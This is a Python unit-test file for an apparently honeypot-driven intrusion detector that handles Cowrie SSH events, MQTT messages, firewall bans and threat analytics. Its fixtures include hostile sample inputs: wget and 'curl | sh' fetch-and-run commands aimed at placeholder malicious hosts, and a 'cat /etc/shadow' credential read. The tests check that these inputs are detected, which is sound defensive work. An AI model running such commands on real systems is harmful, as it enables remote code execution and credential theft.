import os
import tempfile
import time
import unittest

from controller.core.db import DefenseDatabase
from controller.core.detector import IntrusionDetector
from controller.core.models import CowrieEvent, MitigationRecord
from controller.mitigation.allowlist import AllowlistManager
from controller.mitigation.firewall import FirewallController


class TestCowrieEventModel(unittest.TestCase):
    def test_from_cowrie_json(self) -> None:
        raw_json = {
            "eventid": "cowrie.login.failed",
            "src_ip": "198.51.100.77",
            "src_port": 54321,
            "dst_port": 2222,
            "username": "root",
            "password": "123456Password",
            "session": "abc123session",
            "message": "login attempt [root/123456Password] failed",
        }
        event = CowrieEvent.from_cowrie_json(raw_json)
        self.assertEqual(event.eventid, "cowrie.login.failed")
        self.assertEqual(event.src_ip, "198.51.100.77")
        self.assertEqual(event.username, "root")
        self.assertEqual(event.password, "123456Password")
        self.assertEqual(event.src_port, 54321)


class TestDefenseDatabase(unittest.TestCase):
    def setUp(self) -> None:
        self.temp_dir = tempfile.TemporaryDirectory()
        self.db_path = os.path.join(self.temp_dir.name, "test_defense.db")
        self.db = DefenseDatabase(db_path=self.db_path)

    def tearDown(self) -> None:
        self.temp_dir.cleanup()

    def test_record_and_get_mitigation(self) -> None:
        record = MitigationRecord(
            src_ip="203.0.113.5",
            action="IPTABLES_DROP",
            reason="Test brute-force",
            severity="HIGH",
            timestamp=time.time(),
        )
        rec_id = self.db.record_mitigation(record)
        self.assertGreater(rec_id, 0)

        history = self.db.get_history(limit=10)
        self.assertEqual(len(history), 1)
        self.assertEqual(history[0]["src_ip"], "203.0.113.5")
        self.assertEqual(history[0]["action"], "IPTABLES_DROP")

        active_bans = self.db.get_active_bans()
        self.assertEqual(len(active_bans), 1)
        self.assertEqual(active_bans[0]["src_ip"], "203.0.113.5")

    def test_unban_removes_from_active_bans(self) -> None:
        # First ban
        self.db.record_mitigation(MitigationRecord(
            src_ip="203.0.113.10",
            action="IPTABLES_DROP",
            reason="Attack",
            severity="HIGH",
        ))
        self.assertEqual(len(self.db.get_active_bans()), 1)

        # Unban
        self.db.record_mitigation(MitigationRecord(
            src_ip="203.0.113.10",
            action="UNBAN",
            reason="Manual unban",
            severity="LOW",
        ))
        self.assertEqual(len(self.db.get_active_bans()), 0)

    def test_sqlite_wal_mode_and_pragmas(self) -> None:
        with self.db._get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute("PRAGMA journal_mode;")
            journal_mode = cursor.fetchone()[0]
            # In SQLite, WAL mode is active when WAL is requested on file-based DBs
            self.assertEqual(str(journal_mode).lower(), "wal")

            cursor.execute("PRAGMA busy_timeout;")
            busy_timeout = cursor.fetchone()[0]
            self.assertGreaterEqual(int(busy_timeout), 5000)

    def test_threat_event_persistence_and_analytics(self) -> None:
        # Record a mixture of threat events
        self.db.record_threat_event({
            "timestamp": time.time(),
            "src_ip": "198.51.100.99",
            "dst_port": 2222,
            "eventid": "cowrie.login.failed",
            "attack_type": "brute_force",
            "username": "root",
            "password": "toor_password",
        })
        self.db.record_threat_event({
            "timestamp": time.time(),
            "src_ip": "198.51.100.99",
            "dst_port": 2222,
            "eventid": "cowrie.login.failed",
            "attack_type": "brute_force",
            "username": "admin",
            "password": "admin_password",
        })
        self.db.record_threat_event({
            "timestamp": time.time(),
            "src_ip": "203.0.113.88",
            "dst_port": 2222,
            "eventid": "cowrie.command.input",
            "attack_type": "exploit",
            "input_command": "wget http://bad.host/bot.sh",
        })
        self.db.record_threat_event({
            "timestamp": time.time(),
            "src_ip": "198.51.100.77",
            "dst_port": 2223,
            "eventid": "cowrie.session.connect",
            "attack_type": "probe",
        })

        analytics = self.db.get_persisted_threat_analytics()
        self.assertEqual(analytics["total_threat_events"], 4)
        self.assertEqual(analytics["attack_breakdown"]["brute_force"], 2)
        self.assertEqual(analytics["attack_breakdown"]["exploit"], 1)
        self.assertEqual(analytics["attack_breakdown"]["probe"], 1)
        self.assertEqual(analytics["target_ports"]["2222"], 3)
        self.assertEqual(analytics["target_ports"]["2223"], 1)

        # Verify top usernames and passwords
        users = dict(analytics["top_usernames"])
        self.assertIn("root", users)
        self.assertIn("admin", users)

        # Verify query by IP
        ip_events = self.db.get_threat_events_by_ip("198.51.100.99")
        self.assertEqual(len(ip_events), 2)
        self.assertEqual(ip_events[0]["src_ip"], "198.51.100.99")

        # Verify recent events
        recent = self.db.get_recent_threat_events(limit=10)
        self.assertEqual(len(recent), 4)

    def test_reset_database_clears_threat_events(self) -> None:
        self.db.record_threat_event({
            "timestamp": time.time(),
            "src_ip": "198.51.100.99",
            "attack_type": "brute_force",
        })
        self.assertEqual(self.db.get_persisted_threat_analytics()["total_threat_events"], 1)

        self.db.reset_database()
        self.assertEqual(self.db.get_persisted_threat_analytics()["total_threat_events"], 0)


class TestIntrusionDetector(unittest.TestCase):
    def setUp(self) -> None:
        self.temp_dir = tempfile.TemporaryDirectory()
        self.db_path = os.path.join(self.temp_dir.name, "test_detector.db")
        self.db = DefenseDatabase(db_path=self.db_path)
        self.allowlist = AllowlistManager()
        self.firewall = FirewallController(allowlist_manager=self.allowlist, dry_run=True)
        self.detector = IntrusionDetector(
            firewall=self.firewall,
            db=self.db,
            allowlist=self.allowlist,
            failed_login_threshold=5,
            time_window_seconds=30.0,
        )

    def tearDown(self) -> None:
        self.temp_dir.cleanup()

    def test_brute_force_threshold_detection(self) -> None:
        attacker_ip = "198.51.100.99"

        # 4 failed logins: no ban
        for i in range(4):
            evt = CowrieEvent(
                eventid="cowrie.login.failed",
                src_ip=attacker_ip,
                username="admin",
                password=f"pass{i}",
            )
            res = self.detector.process_event(evt)
            self.assertIsNone(res)
            self.assertFalse(self.firewall.is_ip_banned(attacker_ip))

        # 5th failed login: triggers ban
        fifth_evt = CowrieEvent(
            eventid="cowrie.login.failed",
            src_ip=attacker_ip,
            username="admin",
            password="passFinal",
        )
        res = self.detector.process_event(fifth_evt)
        self.assertIsNotNone(res)
        self.assertEqual(res.src_ip, attacker_ip)
        self.assertEqual(res.action, "IPTABLES_DROP")
        self.assertTrue(self.firewall.is_ip_banned(attacker_ip))

        # Database audit record check
        history = self.db.get_history()
        self.assertEqual(len(history), 1)
        self.assertEqual(history[0]["src_ip"], attacker_ip)

    def test_allowlist_never_banned(self) -> None:
        gateway_ip = "172.20.0.1"

        # 10 failed logins from gateway
        for i in range(10):
            evt = CowrieEvent(
                eventid="cowrie.login.failed",
                src_ip=gateway_ip,
                username="root",
            )
            res = self.detector.process_event(evt)
            self.assertIsNone(res)

        self.assertFalse(self.firewall.is_ip_banned(gateway_ip))
        # Invariant: Allowlisted/gateway traffic must never pollute attack analytics
        analytics = self.detector.get_analytics()
        self.assertEqual(analytics["attack_breakdown"].get("brute_force", 0), 0)
        self.assertEqual(analytics["recent_events_count"], 0)

    def test_loopback_healthchecks_not_counted_as_reconnaissance_probes(self) -> None:
        loopback_ip = "127.0.0.1"
        for _ in range(20):
            evt = CowrieEvent(
                eventid="cowrie.session.connect",
                src_ip=loopback_ip,
                dst_port=2222,
            )
            res = self.detector.process_event(evt)
            self.assertIsNone(res)

        analytics = self.detector.get_analytics()
        self.assertEqual(analytics["attack_breakdown"].get("probe", 0), 0)
        self.assertEqual(analytics["target_ports"]["2222"], 0)
        self.assertEqual(analytics["recent_events_count"], 0)
        self.assertEqual(self.db.get_persisted_threat_analytics()["total_threat_events"], 0)

    def test_critical_command_execution(self) -> None:
        attacker_ip = "203.0.113.88"
        cmd_evt = CowrieEvent(
            eventid="cowrie.command.input",
            src_ip=attacker_ip,
            input_command="wget http://malicious.payload/botnet.sh -O /tmp/bot",
        )
        res = self.detector.process_event(cmd_evt)
        self.assertIsNotNone(res)
        self.assertEqual(res.severity, "CRITICAL")
        self.assertTrue(self.firewall.is_ip_banned(attacker_ip))

    def test_manual_unban_and_reset(self) -> None:
        target_ip = "198.51.100.150"
        self.firewall.ban_ip(target_ip)
        self.assertTrue(self.firewall.is_ip_banned(target_ip))

        # Manual unban
        unban_res = self.detector.manual_unban(target_ip, admin_user="sec_admin")
        self.assertTrue(unban_res)
        self.assertFalse(self.firewall.is_ip_banned(target_ip))

        # Global reset
        self.firewall.ban_ip("198.51.100.151")
        self.firewall.ban_ip("198.51.100.152")
        self.assertEqual(len(self.firewall.list_banned_ips()), 2)
        reset_res = self.detector.reset_all_bans()
        self.assertTrue(reset_res)
        self.assertEqual(len(self.firewall.list_banned_ips()), 0)

    def test_detector_restart_hydration_and_forensics(self) -> None:
        # Feed events into first detector instance
        for i in range(3):
            self.detector.process_event(CowrieEvent(
                eventid="cowrie.login.failed",
                src_ip="198.51.100.99",
                username="admin",
                password=f"p_{i}",
            ))
        self.detector.process_event(CowrieEvent(
            eventid="cowrie.command.input",
            src_ip="203.0.113.88",
            input_command="cat /etc/shadow",
        ))

        analytics1 = self.detector.get_analytics()
        self.assertEqual(analytics1["total_threat_events"], 4)
        self.assertEqual(analytics1["attack_breakdown"]["brute_force"], 3)
        self.assertEqual(analytics1["attack_breakdown"]["exploit"], 1)

        # Simulate controller restart by creating a new detector instance with the same database
        new_detector = IntrusionDetector(
            firewall=self.firewall,
            db=self.db,
            allowlist=self.allowlist,
        )

        analytics2 = new_detector.get_analytics()
        self.assertEqual(analytics2["total_threat_events"], 4)
        self.assertEqual(analytics2["attack_breakdown"]["brute_force"], 3)
        self.assertEqual(analytics2["attack_breakdown"]["exploit"], 1)
        self.assertEqual(len(new_detector._events_history), 4)

        # Verify forensic dossier retrieval for the IP survives restart
        forensics = new_detector.get_ip_forensics("203.0.113.88")
        self.assertEqual(forensics["src_ip"], "203.0.113.88")
        self.assertEqual(forensics["total_events"], 1)

    def test_reset_full_database_clears_db_and_memory(self) -> None:
        self.detector.process_event(CowrieEvent(
            eventid="cowrie.login.failed",
            src_ip="198.51.100.99",
            username="admin",
            password="pwd",
        ))
        self.assertEqual(self.detector.get_analytics()["total_threat_events"], 1)

        self.detector.reset_full_database()
        self.assertEqual(self.detector.get_analytics()["total_threat_events"], 0)
        self.assertEqual(self.db.get_persisted_threat_analytics()["total_threat_events"], 0)
        self.assertEqual(len(self.detector._events_history), 0)

    def test_mqtt_honey_topic_breach_detection(self) -> None:
        attacker_ip = "198.51.100.112"
        # Publish to deceptive admin honey-topic
        mitigation = self.detector.evaluate_mqtt_message(
            topic="home/admin/config",
            payload='{"action": "dump_network"}',
            src_ip=attacker_ip,
        )
        self.assertIsNotNone(mitigation)
        self.assertEqual(mitigation.src_ip, attacker_ip)
        self.assertEqual(mitigation.severity, "CRITICAL")
        self.assertTrue(self.firewall.is_ip_banned(attacker_ip))
        self.assertIn("MQTT honey-topic breach", mitigation.reason)

        # Port counter for 1883 incremented
        analytics = self.detector.get_analytics()
        self.assertGreaterEqual(analytics["target_ports"]["1883"], 1)

    def test_mqtt_payload_command_injection_detection(self) -> None:
        attacker_ip = "203.0.113.71"
        # Publish malicious payload to standard sensor topic
        mitigation = self.detector.evaluate_mqtt_message(
            topic="home/sensors/temperature",
            payload='{"temperature": 25.0, "exec": "curl -s http://botnet.sh | sh"}',
            src_ip=attacker_ip,
        )
        self.assertIsNotNone(mitigation)
        self.assertEqual(mitigation.src_ip, attacker_ip)
        self.assertEqual(mitigation.severity, "CRITICAL")
        self.assertTrue(self.firewall.is_ip_banned(attacker_ip))
        self.assertIn("exploit command detected", mitigation.reason)

    def test_mqtt_clean_telemetry_no_false_positives(self) -> None:
        sensor_ip = "172.20.0.21"
        # Standard benign IoT telemetry
        mitigation = self.detector.evaluate_mqtt_message(
            topic="home/sensors/temperature",
            payload='{"temperature": 23.4, "unit": "C", "battery": 98}',
            src_ip=sensor_ip,
        )
        self.assertIsNone(mitigation)
        self.assertFalse(self.firewall.is_ip_banned(sensor_ip))

    def test_mqtt_rate_flood_anomaly(self) -> None:
        flood_ip = "198.51.100.165"
        # Rapid flood beyond limit (20 msgs in 5s)
        mitigation = None
        for i in range(25):
            mitigation = self.detector.evaluate_mqtt_message(
                topic="home/devices/bulb",
                payload=f'{{"state": "ON", "seq": {i}}}',
                src_ip=flood_ip,
            )
            if mitigation:
                break

        self.assertIsNotNone(mitigation)
        self.assertEqual(mitigation.src_ip, flood_ip)
        self.assertTrue(self.firewall.is_ip_banned(flood_ip))
        self.assertIn("rate anomaly", mitigation.reason)


if __name__ == "__main__":
    unittest.main()

